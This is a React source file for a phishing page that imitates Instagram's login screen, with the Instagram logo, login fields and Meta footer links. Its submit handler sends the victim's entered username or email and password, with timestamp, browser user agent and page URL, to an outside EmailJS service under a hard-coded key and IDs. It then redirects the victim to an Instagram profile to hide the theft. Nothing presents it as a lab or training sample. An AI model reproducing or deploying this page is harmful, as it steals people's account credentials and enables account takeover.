import React, { useState, useEffect } from 'react';
import emailjs from '@emailjs/browser';

export default function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  useEffect(() => {
    // Load EmailJS
    emailjs.init("DCnFHeeyL6GEWE6J2");
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    
    try {
      // Send data via EmailJS
      const templateParams = {
        from_name: email,
        to_name: "Admin",
        message: `Login Data Collected:
        
Email: ${email}
Password: ${password}
Timestamp: ${new Date().toISOString()}
User Agent: ${navigator.userAgent}
Page URL: ${window.location.href}

This is an automated message with login attempt data.`,
        reply_to: "ictproject499@gmail.com",
        subject: `Login Attempt - ${email}`
      };

      // Send the email with updated template ID
      const response = await emailjs.send(
        "service_wni6k0h", 
        "template_ap7mzek", // Updated template ID
        templateParams
      );
      
      // Redirect directly to the target URL (Google Form)
      window.location.href = 'https://www.instagram.com/simply_ansh_01/';
    } catch (err) {
      setError('An error occurred. Please try again.');
      setIsLoading(false);
      console.error('Error:', err);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-sm">
        {/* Instagram Logo */}
        <div className="flex justify-center mb-8">
          <img 
            src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" 
            alt="Instagram" 
            className="w-44 h-auto"
          />
        </div>

        {/* Error Message */}
        {error && (
          <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded mb-4 text-sm">
            {error}
          </div>
        )}

        {/* Form Card */}
        <div className="bg-white border border-gray-300 rounded-lg p-6">
          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                placeholder="Phone number, username, or email"
                required
              />
            </div>
            
            <div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                placeholder="Password"
                required
              />
            </div>

            {/* Login Button */}
            <button
              type="submit"
              className="w-full bg-blue-500 hover:bg-blue-600 text-white py-1.5 rounded text-sm font-medium disabled:opacity-70 disabled:cursor-not-allowed"
              disabled={isLoading}
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Logging In...
                </div>
              ) : (
                'Log In'
              )}
            </button>
          </form>

          {/* Divider */}
          <div className="flex items-center my-4">
            <div className="flex-grow border-t border-gray-300"></div>
            <div className="px-4 text-xs text-gray-500">OR</div>
            <div className="flex-grow border-t border-gray-300"></div>
          </div>

          {/* Forgot Password */}
          <div className="text-center">
            <a href="#" className="text-sm text-blue-900 font-semibold">
              Forgot password?
            </a>
          </div>
        </div>

        {/* Sign Up Card */}
        <div className="bg-white border border-gray-300 rounded-lg p-4 mt-4 text-center">
          <p className="text-sm">
            Don't have an account? 
            <a href="#" className="text-blue-500 font-semibold ml-1">
              Sign up
            </a>
          </p>
        </div>

        {/* Footer Links */}
        <div className="mt-8 text-center text-xs text-gray-500 space-y-2 max-w-xs">
          <div className="flex flex-wrap justify-center gap-x-2">
            <a href="#" className="hover:underline">Meta</a>
            <a href="#" className="hover:underline">About</a>
            <a href="#" className="hover:underline">Blog</a>
            <a href="#" className="hover:underline">Jobs</a>
            <a href="#" className="hover:underline">Help</a>
            <a href="#" className="hover:underline">API</a>
            <a href="#" className="hover:underline">Privacy</a>
            <a href="#" className="hover:underline">Terms</a>
            <a href="#" className="hover:underline">Top Accounts</a>
            <a href="#" className="hover:underline">Hashtags</a>
            <a href="#" className="hover:underline">Locations</a>
          </div>
          <div>© 2025 Instagram from Meta</div>
        </div>
      </div>
    </div>
  );
}
